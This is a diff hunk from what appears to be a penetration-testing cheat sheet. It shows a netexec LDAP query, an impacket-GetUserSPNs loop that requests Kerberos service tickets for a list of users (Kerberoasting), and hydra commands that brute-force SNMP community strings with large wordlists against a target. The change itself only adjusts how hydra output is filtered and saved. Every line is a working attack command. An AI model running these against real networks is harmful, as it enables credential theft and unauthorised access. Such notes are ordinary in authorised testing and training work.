@@ -340,8 +340,8 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
 [*] (161) SNMP
-(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t60 -o SNMPsmall.hydra -I &)
-(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t60 -o SNMPhuge.hydra -I &)
+(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t60 -I 2>/dev/null | grep '[snmp]' | tee SNMPsmall.hydra &)
+(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t60 -I 2>/dev/null | grep '[snmp]' | tee SNMPhuge.hydra &)
 
 cat *.hydra
 
